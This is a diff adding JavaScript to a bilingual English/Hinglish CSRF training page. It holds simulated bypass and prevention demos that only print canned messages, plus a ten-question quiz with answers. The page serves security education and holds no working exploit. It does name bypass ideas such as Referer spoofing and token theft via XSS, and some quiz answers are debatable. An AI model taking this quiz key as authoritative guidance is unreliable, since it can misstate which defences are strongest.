+      switch(protectionType) {
+        case 'csrf-token':
+          message = isHinglish
+            ? '✅ CSRF token protection bypass safal!\n\nToken validation weakness ka faida uthaya gaya.'
+            : '✅ CSRF token protection bypass successful!\n\nExploited token validation weakness.';
+          break;
+        case 'same-site':
+          message = isHinglish
+            ? '✅ SameSite cookie bypass safal!\n\nCookie policy ki weakness ka faida uthaya gaya.'
+            : '✅ SameSite cookie bypass successful!\n\nExploited cookie policy weakness.';
+          break;
+        case 'referer':
+          message = isHinglish
+            ? '✅ Referer validation bypass safal!\n\nReferer header manipulation dwara protection ko todi gayi.'
+            : '✅ Referer validation bypass successful!\n\nBypassed protection using referer header manipulation.';
+          break;
+        case 'custom-header':
+          message = isHinglish
+            ? '✅ Custom header bypass safal!\n\nCustom header validation weakness ka faida uthaya gaya.'
+            : '✅ Custom header bypass successful!\n\nExploited custom header validation weakness.';
+          break;
+      }
+
+      result.innerHTML = message;
+      showNotification(isHinglish ? 'Bypass test safal!' : 'Bypass test successful!');
+    }
+
+    // Additional Lab functions
+    function testCsrfPrevention() {
+      const preventionType = document.getElementById('prevention-type').value;
+      const result = document.getElementById('prevention-result');
+
+      let message = '';
+
+      if (preventionType === 'none') {
+        message = isHinglish
+          ? `❌ Koi suraksha nahi!\n\nCSRF attack safal hoga kyunki koi bachav upay nahi hai.`
+          : `❌ No protection!\n\nCSRF attack will succeed because no protection is in place.`;
+      } else {
+        message = isHinglish
+          ? `✅ ${preventionType.toUpperCase()} suraksha lagoo hai!\n\nCSRF attack rok diya gaya.`
+          : `✅ ${preventionType.toUpperCase()} protection applied!\n\nCSRF attack prevented.`;
+      }
+
+      result.innerHTML = message;
+    }
+
+    function testCsrfLabPrevention() {
+      const preventionType = document.getElementById('test-prevention').value;
+      const result = document.getElementById('lab-result');
+
+      let message = '';
+
+      if (preventionType === 'none' || preventionType === 'weak') {
+        message = isHinglish
+          ? `❌ ${preventionType.toUpperCase()} suraksha prabhavi nahi hai!\n\nCSRF attack safal hoga.`
+          : `❌ ${preventionType.toUpperCase()} protection not effective!\n\nCSRF attack will succeed.`;
+      } else {
+        message = isHinglish
+          ? `✅ ${preventionType.toUpperCase()} suraksha prabhavi hai!\n\nCSRF attack rok diya gaya.`
+          : `✅ ${preventionType.toUpperCase()} protection effective!\n\nCSRF attack prevented.`;
+      }
+
+      result.innerHTML = message;
+    }
+
+    function clearCsrfLabResults() {
+      document.getElementById('lab-result').textContent = '// Lab results will appear here';
+    }
+
+    // Quiz Questions (10 Questions)
+    const csrfQuizQuestions = [
+      {
+        question: {
+          en: "What does CSRF stand for?",
+          hi: "CSRF ka matlab kya hai?"
+        },
+        options: {
+          en: [
+            "Cross-Site Request Forgery",
+            "Cross-Site Response Function",
+            "Client-Side Request Flow",
+            "Common Security Request Form"
+          ],
+          hi: [
+            "Cross-Site Request Forgery",
+            "Cross-Site Response Function",
+            "Client-Side Request Flow",
+            "Common Security Request Form"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "CSRF stands for Cross-Site Request Forgery, an attack that tricks users into executing unwanted actions.",
+          hi: "CSRF ka matlab hai Cross-Site Request Forgery, ek hamlahara jo users ko woh actions perform karwane mein fool karta hai jo woh nahi chahte."
+        }
+      },
+      {
+        question: {
+          en: "Which HTTP methods are typically affected by CSRF attacks?",
+          hi: "CSRF attacks dwara kaunse HTTP methods typically affected hote hain?"
+        },
+        options: {
+          en: [
+            "State-changing methods like POST, PUT, DELETE",
+            "Read-only methods like GET, HEAD",
+            "Authentication methods only",
+            "All HTTP methods equally"
+          ],
+          hi: [
+            "State-changing methods jaise POST, PUT, DELETE",
+            "Read-only methods jaise GET, HEAD",
+            "Sirf authentication methods",
+            "Sabhi HTTP methods equally"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "CSRF attacks typically target state-changing operations that modify data on the server.",
+          hi: "CSRF attacks typically woh state-changing operations ko target karte hain jo server par data ko modify karte hain."
+        }
+      },
+      {
+        question: {
+          en: "What is the most effective way to prevent CSRF attacks?",
+          hi: "CSRF attacks ko rokne ka sabse prabhavi tarika kya hai?"
+        },
+        options: {
+          en: [
+            "Using cryptographically secure CSRF tokens",
+            "Validating the Host header",
+            "Using HTTPS only",
+            "Rate limiting all requests"
+          ],
+          hi: [
+            "Cryptographically secure CSRF tokens ka upyog",
+            "Host header ki validation",
+            "Sirf HTTPS ka upyog",
+            "Sabhi requests par rate limiting"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "Cryptographically secure CSRF tokens are the most effective protection against CSRF attacks.",
+          hi: "CSRF attacks ke khilaf sabse prabhavi suraksha cryptographically secure CSRF tokens hain."
+        }
+      },
+      {
+        question: {
+          en: "How do SameSite cookies help prevent CSRF?",
+          hi: "SameSite cookies CSRF ko kaise rokne mein help karte hain?"
+        },
+        options: {
+          en: [
+            "Prevent cookies from being sent in cross-site requests",
+            "Encrypt cookies automatically",
+            "Validate origin headers",
+            "Check referer values"
+          ],
+          hi: [
+            "Cross-site requests mein cookies bhejne se rokte hain",
+            "Cookies ko automatically encrypt karte hain",
+            "Origin headers validate karte hain",
+            "Referer values check karte hain"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "SameSite cookies prevent authentication cookies from being automatically included in cross-site requests.",
+          hi: "SameSite cookies authentication cookies ko cross-site requests mein automatic include hone se rokti hain."
+        }
+      },
+      {
+        question: {
+          en: "What is a Referer header attack in CSRF context?",
+          hi: "CSRF context mein Referer header attack kya hai?"
+        },
+        options: {
+          en: [
+            "Bypassing referer validation by spoofing the header",
+            "Reading the referer to steal user data",
+            "Manipulating the referer to redirect users",
+            "Using referer to track user behavior"
+          ],
+          hi: [
+            "Referer header ko spoof karke referer validation ko bypass karna",
+            "User data steal karne ke liye referer padhna",
+            "Users ko redirect karne ke liye referer manipulate karna",
+            "User behavior track karne ke liye referer ka upyog karna"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "A Referer header attack in CSRF context involves manipulating or spoofing the HTTP Referer header to bypass validation checks.",
+          hi: "CSRF context mein referer header attack mein HTTP Referer header ko manipulate ya spoof karke validation checks ko bypass kiya jata hai."
+        }
+      },
+      {
+        question: {
+          en: "Which of these is NOT a common CSRF protection mechanism?",
+          hi: "Inmein se kaunsa common CSRF protection mechanism nahi hai?"
+        },
+        options: {
+          en: [
+            "CSRF tokens",
+            "HTTP Authentication headers",
+            "CAPTCHA on sensitive operations",
+            "Input validation on server"
+          ],
+          hi: [
+            "CSRF tokens",
+            "HTTP Authentication headers",
+            "Sensitive operations par CAPTCHA",
+            "Server par input validation"
+          ]
+        },
+        correct: 1,
+        explanation: {
+          en: "While HTTP Authentication headers prevent unauthorized access, they don't specifically prevent CSRF attacks.",
+          hi: "HTTP Authentication headers unauthorized access se rok sakte hain, lekin woh specifically CSRF attacks nahi rok sakte."
+        }
+      },
+      {
+        question: {
+          en: "What makes GET requests vulnerable to CSRF when POST is secure?",
+          hi: "POST secure hone par GET requests ko CSRF ke liye vulnerable kaun si baat banati hai?"
+        },
+        options: {
+          en: [
+            "GET requests can be triggered via img src from cross-site",
+            "GET requests don't require authentication",
+            "GET requests don't have content-type headers",
+            "GET requests are always public endpoints"
+          ],
+          hi: [
+            "GET requests cross-site se img src ke through trigger ki ja sakti hain",
+            "GET requests ko authentication ki zaroorat nahi hoti",
+            "GET requests mein content-type headers nahi hote",
+            "GET requests hamesha public endpoints hote hain"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "GET requests can be triggered from cross-site origins using img src, script src, or meta refresh tags.",
+          hi: "GET requests cross-site origins se img src, script src, ya meta refresh tags ka upyog karke trigger ki ja sakti hain."
+        }
+      },
+      {
+        question: {
+          en: "How can XSS help in bypassing CSRF protections?",
+          hi: "XSS CSRF protections ko bypass karne mein kaise help kar sakta hai?"
+        },
+        options: {
+          en: [
+            "Reading and stealing CSRF tokens",
+            "Bypassing SameSite cookie restrictions",
+            "Spoofing referer headers",
+            "Creating cross-site forms"
+          ],
+          hi: [
+            "CSRF tokens ko read aur steal karna",
+            "SameSite cookie restrictions ko bypass karna",
+            "Referer headers ko spoof karna",
+            "Cross-site forms create karna"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "If there's an XSS vulnerability on the target site, an attacker can read and steal the CSRF token to craft valid CSRF payloads.",
+          hi: "Agar target site par XSS vulnerability hai, to attacker CSRF token ko read aur steal kar kar valid CSRF payloads craft kar sakta hai."
+        }
+      },
+      {
+        question: {
+          en: "Which of these is considered the strongest CSRF protection?",
+          hi: "Inmein se kaunsa sabse mazboot CSRF protection mana jata hai?"
+        },
+        options: {
+          en: [
+            "Double-submit cookie pattern with strong validation",
+            "IP address validation",
+            "Referer header checking alone",
+            "Using different subdomains"
+          ],
+          hi: [
+            "Strong validation ke saath double-submit cookie pattern",
+            "IP address validation",
+            "Akela referer header checking",
+            "Different subdomains ka upyog"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "The double-submit cookie pattern, when implemented correctly with strong validation, provides robust CSRF protection.",
+          hi: "Double-submit cookie pattern, jab correctly implement kiya jata hai strong validation ke saath, to robust CSRF protection deta hai."
+        }
+      },
+      {
+        question: {
+          en: "What should you do if you discover a CSRF vulnerability?",
+          hi: "Agar aapko CSRF vulnerability pata chali to aapko kya karna chahiye?"
+        },
+        options: {
+          en: [
+            "Report it responsibly and implement CSRF tokens",
+            "Exploit it to demonstrate the risk",
+            "Ignore it if no financial impact",
+            "Change all user passwords"
+          ],
+          hi: [
+            "Responsibly report karein aur CSRF tokens implement karein",
+            "Risk demonstrate karne ke liye ise exploit karein",
+            "Agar koi financial impact nahi hai to ignore karein",
+            "Sabhi user passwords change karein"
+          ]
+        },
+        correct: 0,
+        explanation: {
+          en: "CSRF vulnerabilities should be reported responsibly and fixed by implementing proper CSRF protection mechanisms.",
+          hi: "CSRF vulnerabilities ko responsibly report karna chahiye aur proper CSRF protection mechanisms implement karke fix karna chahiye."
+        }
+      }
+    ];
+
+    // Render CSRF Quiz
+    function renderCsrfQuiz() {
+      const quizContainer = document.getElementById('quiz-questions');
+      quizContainer.innerHTML = '';
+      csrfQuizQuestions.forEach((q, index) => {
+        const questionDiv = document.createElement('div');
+        questionDiv.className = 'quiz-question';
+        const qText = isHinglish ? q.question.hi : q.question.en;
+        const opts = isHinglish ? q.options.hi : q.options.en;
+        questionDiv.innerHTML = `
+          <h4>Q${index + 1}: ${qText}</h4>
+          <div class="options" id="options-${index}">
+            ${opts.map((opt, i) => `
+              <div class="option" onclick="selectCsrfQuizOption(${index}, ${i})">${opt}</div>
+            `).join('')}
+          </div>
+        `;
+        quizContainer.appendChild(questionDiv);
+      });
+    }
+
+    // Track selected answers
+    const selectedCsrfAnswers = new Array(csrfQuizQuestions.length).fill(-1);
+
+    // Card interaction functions - exposed globally for HTML event handlers
+    window.highlightCard = function(card) {
+      if (!card) return;
+      card.classList.add('pop-out');
+      const heading = card.querySelector('h3');
+      if (heading) {
+        showNotification('Hovering: ' + heading.textContent);
+      }
+    };
+
+    window.unhighlightCard = function(card) {
+      if (!card) return;
+      if (!card.classList.contains('focused')) {
+        card.classList.remove('pop-out');
+      }
+    };
+
+    window.focusCard = function(card) {
+      if (!card) return;
+      document.querySelectorAll('.lecture-card').forEach(c => {
+        c.classList.remove('focused');
+        c.classList.remove('pop-out');
+      });
+      card.classList.add('focused');
+      card.classList.add('pop-out');
+      const heading = card.querySelector('h3');
+      if (heading) {
+        showNotification('Focused on: ' + heading.textContent);
+      }
+    };
+
+    // Select CSRF Quiz Option
+    window.selectCsrfQuizOption = function(questionIndex, optionIndex) {
+      document.querySelectorAll(`#options-${questionIndex} .option`).forEach(opt => {
+        opt.classList.remove('selected');
+      });
+      document.querySelectorAll(`#options-${questionIndex} .option`)[optionIndex].classList.add('selected');
+      selectedCsrfAnswers[questionIndex] = optionIndex;
+    };
+
+    // Submit CSRF Quiz
+    window.submitCsrfQuiz = function() {
+      let score = 0;
+      const feedbackDiv = document.createElement('div');
+      feedbackDiv.id = 'csrf-feedback';
+      feedbackDiv.style.display = 'block';
+      document.getElementById('quiz-questions').appendChild(feedbackDiv);
+
+      csrfQuizQuestions.forEach((q, index) => {
+        const options = document.querySelectorAll(`#options-${index} .option`);
+        const explanation = isHinglish ? q.explanation.hi : q.explanation.en;
+
+        if (selectedCsrfAnswers[index] === q.correct) {
+          score++;
+          options[q.correct].classList.add('correct');
+          if (selectedCsrfAnswers[index] !== -1) options[selectedCsrfAnswers[index]].classList.add('correct');
+        } else {
+          options[q.correct].classList.add('correct');
+          if (selectedCsrfAnswers[index] !== -1 && selectedCsrfAnswers[index] !== q.correct) {
+            options[selectedCsrfAnswers[index]].classList.add('incorrect');
+          }
+        }
+
+        feedbackDiv.innerHTML += `<strong>Q${index + 1}:</strong> ${explanation}<br><br>`;
+      });
+
+      document.getElementById('score-display').textContent = `Score: ${score} / ${csrfQuizQuestions.length}`;
+      showNotification(isHinglish ? `Quiz pura! Score: ${score}/${csrfQuizQuestions.length}` : `Quiz complete! You scored ${score}/${csrfQuizQuestions.length}`);
+    };
+
+    // SAFETY: All functions are disabled for educational purposes only
+    // No automatic initialization to prevent any potential redirect issues
+    // All demos must be activated manually by user interaction only
+
+    // Educational demo functions are defined above but not executed automatically
+    // - generateCsrfPayload(): requires button click
+    // - testAdvancedCsrfTechnique(): disabled
+    // - testCsrfScenario(): disabled
+    // - renderCsrfQuiz(): would be called by toggleLanguage(), not auto-executed
+
+    // This script is for EDUCATIONAL PURPOSES ONLY - no real security risks
+
+    })();
+  </script>
+</body>
+</html>
